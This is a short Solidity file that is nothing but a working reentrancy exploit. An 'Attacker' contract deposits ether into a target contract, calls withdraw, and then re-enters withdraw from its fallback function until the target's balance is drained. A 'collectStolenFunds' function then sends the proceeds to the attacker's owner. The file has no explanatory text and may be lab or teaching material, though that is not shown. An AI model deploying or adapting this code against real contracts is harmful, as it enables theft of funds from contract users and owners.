pragma solidity ^0.4.24;

interface IDangerous {
    function depositMoney() external payable;
    function withdraw(uint amount) external;
}

contract Attacker {
    IDangerous public target;
    address public owner;
    uint public attackAmount;

    constructor(address _targetAddress) public {
        target = IDangerous(_targetAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0);
        attackAmount = msg.value;
        target.depositMoney.value(attackAmount)();
        target.withdraw(attackAmount);
    }

    function () external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function collectStolenFunds() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
